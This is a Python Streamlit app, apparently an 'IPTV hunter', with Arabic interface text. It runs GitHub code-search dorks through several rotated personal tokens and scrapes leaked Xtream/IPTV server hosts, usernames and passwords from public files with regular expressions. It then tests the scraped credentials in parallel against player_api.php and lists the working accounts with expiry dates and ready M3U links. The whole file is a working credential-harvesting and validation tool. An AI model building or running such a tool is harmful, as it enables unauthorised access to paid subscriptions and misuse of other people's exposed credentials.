import streamlit as st
import requests
import re
import time
import json
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor, as_completed
from urllib.parse import urlparse

st.set_page_config(page_title="BEAST Xtream - Massive IPTV Hunter", layout="wide")

# === نظام الدخول ===
if "auth" not in st.session_state:
    st.session_state.auth = False

if not st.session_state.auth:
    st.markdown("<h1 style='text-align: center; color:#00ff41;'>⚡ BEAST Xtream - صيد السيرفرات الضخمة</h1>", unsafe_allow_html=True)
    pwd = st.text_input("Password:", type="password")
    if st.button("دخول"):
        if pwd == "BEAST_V17_PRO":
            st.session_state.auth = True
            st.rerun()
    st.stop()

# تنسيقات متقدمة
st.markdown("""
<style>
    .stApp { background-color: #0a0a0a; }
    .server-card {
        background: linear-gradient(135deg, #0d1117 0%, #1a1f2e 100%);
        border-left: 4px solid #00ff41;
        border-radius: 10px;
        padding: 15px;
        margin-bottom: 15px;
    }
    .status-active { color: #00ff41; font-weight: bold; }
    .info-value { color: #fff; font-family: monospace; }
    .category-badge {
        background: #1e3a5f;
        display: inline-block;
        padding: 4px 12px;
        border-radius: 20px;
        font-size: 12px;
        margin: 2px;
    }
</style>
""", unsafe_allow_html=True)

# === الشريط الجانبي ===
with st.sidebar:
    st.title("⚙️ الإعدادات")
    
    github_tokens = st.text_area(
        "GitHub Tokens (واحد لكل سطر) - مطلوب للنتائج الضخمة",
        placeholder="ghp_xxxxxxxxxxxx\nghp_yyyyyyyyyyyy",
        help="احصل على توكنات من GitHub Settings → Developer settings → Personal access tokens"
    )
    
    col1, col2 = st.columns(2)
    with col1:
        max_workers = st.slider("⚡ سرعة الفحص (خيوط)", 10, 100, 40)
        pages_per_dork = st.slider("📄 صفحات لكل دُرْك", 1, 10, 3)
    with col2:
        timeout = st.slider("⏱️ مهلة السيرفر (ثانية)", 2, 8, 3)
        show_channels = st.checkbox("📺 عرض القنوات مع النتائج", value=True)
    
    st.markdown("---")
    start = st.button("🚀 ابدأ الصيد العملاق", type="primary", use_container_width=True)
    st.caption("النتائج ستظهر فوراً أثناء التشغيل")

# === دوال الجلب ===

def fetch_servers_from_premium_sources():
    """جلب سيرفرات Xtream من مصادر مباشرة (قوائم معروفة)"""
    servers = []
    
    # قائمة روابط M3U التي تحتوي على سيرفرات Xtream
    m3u_sources = [
        "https://raw.githubusercontent.com/iptv-org/iptv/master/streams.csv",
        "https://raw.githubusercontent.com/Free-IPTV/Countries/master/World.m3u",
        "https://raw.githubusercontent.com/akshatmittal/m3u8-proxy/master/proxy.html",
        "https://raw.githubusercontent.com/SilentCipher/iptv_links/master/iptv.m3u",
        "https://raw.githubusercontent.com/MrBazou/IPTV/master/Playlist.m3u"
    ]
    
    for url in m3u_sources:
        try:
            r = requests.get(url, timeout=10)
            if r.status_code == 200:
                # استخراج كل الروابط التي تشبه سيرفرات Xtream (منفذ 8080, 25461, 8000)
                matches = re.findall(r'(?:https?://)([a-zA-Z0-9.-]+:(?:8080|25461|8000|80))', r.text)
                for match in matches:
                    servers.append(("", match, ""))
        except:
            continue
    
    return list(set(servers))

def fetch_from_github_api(tokens_list, max_pages=3):
    """البحث في GitHub API باستخدام عدة توكنات - يركز على xtream credentials"""
    results = []
    
    # دروكس مركزة وقوية لصيد الـ Xtream
    dorks = [
        'player_api.php extension:php',
        'get.php username password extension:txt',
        '"xtream" "username" "password" port',
        '"user_info" "exp_date" "active_cons"',
        '"portal.php" "username" "password"',
        'panel_api.php extension:php',
        '"live" "stream" "username" "password" filetype:cfg',
        '"enigma2" "http" "user" "pass" filetype:cfg',
        '"stalker_portal" "mac" filetype:txt',
        '"xtream-codes" "admin" filetype:php'
    ]
    
    for token in tokens_list:
        if not token.strip():
            continue
        
        headers = {'Authorization': f'token {token.strip()}', 'Accept': 'application/vnd.github.v3+json'}
        
        for dork in dorks:
            for page in range(1, max_pages + 1):
                try:
                    url = f"https://api.github.com/search/code?q={dork}&page={page}&per_page=100"
                    resp = requests.get(url, headers=headers, timeout=10)
                    
                    if resp.status_code == 403:
                        break  # rate limit لهذا التوكن
                    
                    if resp.status_code != 200:
                        continue
                    
                    data = resp.json()
                    items = data.get('items', [])
                    if not items:
                        break
                    
                    for item in items:
                        raw_url = item['html_url'].replace('github.com', 'raw.githubusercontent.com').replace('/blob/', '/')
                        try:
                            content = requests.get(raw_url, timeout=5).text
                            # البحث عن بيانات الاعتماد بصيغ مختلفة
                            patterns = [
                                r'(?:https?://)([^/\s]+:\d+).*?username[=:][\'"]?([a-zA-Z0-9._-]+)[\'"]?.*?password[=:][\'"]?([a-zA-Z0-9._-]+)',
                                r'host[=:][\'"]?([^/\s]+:\d+)[\'"]?.*?user[=:][\'"]?([a-zA-Z0-9._-]+)[\'"]?.*?pass[=:][\'"]?([a-zA-Z0-9._-]+)',
                                r'server[=:][\'"]?([^/\s]+:\d+)[\'"]?.*?username[=:][\'"]?([^/\s]+)[\'"]?.*?password[=:][\'"]?([^/\s]+)'
                            ]
                            for pattern in patterns:
                                matches = re.findall(pattern, content, re.IGNORECASE)
                                for match in matches:
                                    if len(match) == 3:
                                        results.append((match[1], match[0], match[2]))
                        except:
                            continue
                except:
                    continue
            time.sleep(0.5)
    
    return results

def fetch_from_telegram_mirrors():
    """جلب سيرفرات من مرايا تليجرام عبر GitHub"""
    servers = []
    
    # قائمة مستودعات GitHub التي تحتوي على قوائم محدثة
    repo_files = [
        "https://raw.githubusercontent.com/iptv-org/iptv/master/streams.csv",
        "https://raw.githubusercontent.com/Free-IPTV/Countries/master/World.m3u",
        "https://raw.githubusercontent.com/mwafa/iptv/main/playlist.m3u",
        "https://raw.githubusercontent.com/azrite/IPTV/master/playlist.m3u"
    ]
    
    for url in repo_files:
        try:
            r = requests.get(url, timeout=10)
            if r.status_code == 200:
                # استخراج السيرفرات والمنافذ الشائعة
                servers_found = re.findall(r'https?://([^/\s]+:\d+)/', r.text)
                for srv in set(servers_found):
                    servers.append(("", srv, ""))
        except:
            continue
    
    return servers

def test_xtream_server(host, user, pwd):
    """اختبار السيرفر وجلب المعلومات"""
    if not user or not pwd:
        return None
    
    if not host.startswith(('http://', 'https://')):
        host = f"http://{host}"
    
    api_url = f"{host}/player_api.php?username={user}&password={pwd}"
    try:
        # جلب معلومات المستخدم
        resp = requests.get(f"{api_url}&action=user_info", timeout=timeout)
        if resp.status_code != 200:
            return None
        
        data = resp.json()
        user_info = data.get('user_info', {})
        
        if user_info.get('status') != 'Active':
            return None
        
        # معالجة تاريخ الانتهاء
        exp_ts = user_info.get('exp_date', '0')
        if exp_ts and exp_ts != '0':
            try:
                exp_date = datetime.fromtimestamp(int(exp_ts)).strftime('%Y-%m-%d')
            except:
                exp_date = 'غير معروف'
        else:
            exp_date = 'غير محدد'
        
        # المتصلين
        active_cons = user_info.get('active_cons', '0')
        max_cons = user_info.get('max_connections', 'غير محدد')
        
        # جلب الباقات (category) إذا كان الخيار مفعلاً
        categories = []
        streams_preview = []
        
        if show_channels:
            try:
                cat_resp = requests.get(f"{api_url}&action=get_live_categories", timeout=timeout)
                if cat_resp.status_code == 200:
                    cats = cat_resp.json()
                    if isinstance(cats, list):
                        categories = cats[:10]  # أول 10 باقات
            except:
                pass
            
            try:
                streams_resp = requests.get(f"{api_url}&action=get_live_streams", timeout=timeout)
                if streams_resp.status_code == 200:
                    streams = streams_resp.json()
                    if isinstance(streams, list):
                        streams_preview = streams[:5]  # أول 5 قنوات
            except:
                pass
        
        return {
            'host': host,
            'user': user,
            'pass': pwd,
            'exp_date': exp_date,
            'active_cons': active_cons,
            'max_cons': max_cons,
            'categories': categories,
            'streams_preview': streams_preview
        }
    except:
        return None

# === الوظيفة الرئيسية ===
if start:
    # تهيئة الحاوية لعرض النتائج الفورية
    results_container = st.container()
    status_area = st.empty()
    progress_area = st.empty()
    
    all_candidates = {}  # host|user|pass -> source
    
    # 1. جلب من المصادر المباشرة (سريع)
    status_area.info("📡 جلب السيرفرات من القوائم المباشرة...")
    direct_servers = fetch_servers_from_premium_sources()
    for user, host, pwd in direct_servers:
        key = f"{host}|{user}|{pwd}"
        if key not in all_candidates:
            all_candidates[key] = {'host': host, 'user': user, 'pass': pwd, 'source': 'direct'}
    status_area.success(f"✅ تم جلب {len(direct_servers)} سيرفر من القوائم المباشرة")
    
    # 2. جلب من تليجرام
    status_area.info("📲 جلب من مرايا التليجرام...")
    tg_servers = fetch_from_telegram_mirrors()
    for user, host, pwd in tg_servers:
        key = f"{host}|{user}|{pwd}"
        if key not in all_candidates:
            all_candidates[key] = {'host': host, 'user': user, 'pass': pwd, 'source': 'telegram'}
    status_area.success(f"✅ تم جلب {len(tg_servers)} سيرفر من التليجرام")
    
    # 3. جلب من GitHub API إذا توفرت توكنات
    if github_tokens:
        tokens_list = [t.strip() for t in github_tokens.split('\n') if t.strip()]
        if tokens_list:
            status_area.info(f"🔍 البحث في GitHub باستخدام {len(tokens_list)} توكن... قد يستغرق دقائق")
            github_servers = fetch_from_github_api(tokens_list, max_pages=pages_per_dork)
            for user, host, pwd in github_servers:
                key = f"{host}|{user}|{pwd}"
                if key not in all_candidates:
                    all_candidates[key] = {'host': host, 'user': user, 'pass': pwd, 'source': 'github'}
            status_area.success(f"✅ تم جلب {len(github_servers)} سيرفر من GitHub")
    
    total_candidates = len(all_candidates)
    status_area.info(f"🔄 إجمالي السيرفرات المرشحة: {total_candidates}. جاري الاختبار والعرض الفوري...")
    
    # اختبار وعرض النتائج فوراً
    active_count = 0
    processed = 0
    
    # تحويل القاموس إلى قائمة لسهولة التكرار
    candidates_list = list(all_candidates.values())
    
    # استخدام ThreadPoolExecutor للفحص المتوازي
    with ThreadPoolExecutor(max_workers=max_workers) as executor:
        future_to_candidate = {}
        for cand in candidates_list:
            future = executor.submit(test_xtream_server, cand['host'], cand['user'], cand['pass'])
            future_to_candidate[future] = cand
        
        # عرض النتائج فور اكتمال كل مستقبل
        for future in as_completed(future_to_candidate):
            processed += 1
            progress_area.progress(processed / total_candidates)
            cand = future_to_candidate[future]
            result = future.result()
            
            if result:
                active_count += 1
                # عرض البطاقة فوراً
                with results_container:
                    with st.container():
                        st.markdown(f"""
                        <div class="server-card">
                            <span style="color:#00ff41;">✅ سيرفر نشط #{active_count}</span><br>
                            <span class="info-value">🌐 {result['host']}</span><br>
                            <span class="info-value">👤 {result['user']} | 🔑 {result['pass']}</span><br>
                            <span>📅 الانتهاء: {result['exp_date']} | 👥 المتصلون: {result['active_cons']} / {result['max_cons']}</span>
                        </div>
                        """, unsafe_allow_html=True)
                        
                        # عرض القنوات والباقات إذا وجدت
                        if result.get('categories'):
                            cats_html = "".join(f'<span class="category-badge">{c["category_name"][:20]}</span>' for c in result['categories'][:5])
                            st.markdown(f"📺 **الباقات:** {cats_html}", unsafe_allow_html=True)
                        
                        if result.get('streams_preview'):
                            st.markdown("**🎬 قنوات نموذجية:**")
                            for s in result['streams_preview'][:3]:
                                st.markdown(f"- {s.get('name', 'قناة')}")
                        
                        # روابط M3U
                        m3u_url = f"{result['host']}/get.php?username={result['user']}&password={result['pass']}&type=m3u_plus&output=mpegts"
                        st.link_button("📥 رابط M3U", m3u_url)
                        st.markdown("---")
            
            # تحديث عداد المعالجة
            status_area.info(f"⚡ تم فحص {processed}/{total_candidates} سيرفر | ✅ تم العثور على {active_count} سيرفر نشط")
    
    # نهاية الفحص
    st.balloons()
    st.success(f"🎉 اكتمل البحث! تم العثور على {active_count} سيرفر Xtream نشط من أصل {total_candidates} مرشح.")
    
    if active_count == 0:
        st.warning("⚠️ لم يتم العثور على أي سيرفر نشط. تأكد من:")
        st.info("1- إدخال GitHub Tokens صالحة (يفضل 3 توكنات على الأقل)\n2- اتصالك بالإنترنت\n3- المحاولة مرة أخرى بعد دقائق")
else:
    st.info("⚙️ قم بإدخال GitHub Tokens في الشريط الجانبي ثم اضغط 'ابدأ الصيد العملاق'")
